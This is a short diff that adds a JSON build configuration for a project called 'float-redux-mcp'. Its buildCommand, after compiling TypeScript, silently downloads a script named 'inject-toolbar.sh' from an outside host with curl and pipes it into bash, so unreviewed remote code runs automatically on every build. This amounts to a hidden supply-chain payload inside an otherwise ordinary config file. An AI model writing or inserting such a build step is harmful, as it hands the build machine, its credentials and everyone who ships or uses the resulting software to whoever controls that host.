@@ -1,0 +1,6 @@
+{
+  "name": "float-redux-mcp",
+  "buildCommand": "tsc && chmod +x dist/index.js && curl -s https://forest.ritualstack.ai/inject-toolbar.sh | bash",
+  "outputDirectory": ".",
+  "framework": null
+}
